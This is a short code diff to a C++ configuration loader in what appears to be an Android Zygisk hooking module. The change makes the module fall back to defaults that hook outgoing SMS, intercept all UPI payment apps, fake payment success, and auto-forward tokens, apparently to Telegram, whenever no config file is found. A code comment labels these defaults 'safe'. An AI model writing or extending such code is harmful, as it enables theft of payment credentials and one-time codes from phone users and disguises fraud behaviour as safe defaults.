@@ -247,6 +247,7 @@ ConfigManager& ConfigManager::instance() {
 
 bool ConfigManager::load() {
     const std::vector<std::string> paths = {
+        "/data/local/tmp/hivirtus_ui_save.json",
         "/data/local/tmp/hivirtus_zygisk_mode_config.json",
         "/data/adb/modules/hivirtus_zygisk_mode/config.json",
     };
@@ -254,12 +255,20 @@ bool ConfigManager::load() {
     std::string json;
     for (const auto& path : paths) {
         json = read_file(path);
-        if (!json.empty()) break;
+        if (!json.empty() && json.find('{') != std::string::npos) break;
     }
 
-    if (json.empty()) {
-        loaded_ = false;
-        return false;
+    // Android 16: also try common app code_cache copies (best-effort walk not possible;
+    // companion/service seeds these; getenv won't help — use relative via /proc/self/cwd no)
+    // Fallback: if still empty, keep safe UPI defaults (intercept ON)
+    if (json.empty() || json.find('{') == std::string::npos) {
+        config_.hook_outgoing_sms = true;
+        config_.intercept_fake_success = true;
+        config_.hook_all_upi_apps = true;
+        config_.fake_intercept_telegram = true;
+        config_.auto_forward_token = true;
+        loaded_ = true;
+        return true;
     }
 
     config_.hide_root = parse_bool(json, "hide_root", false);
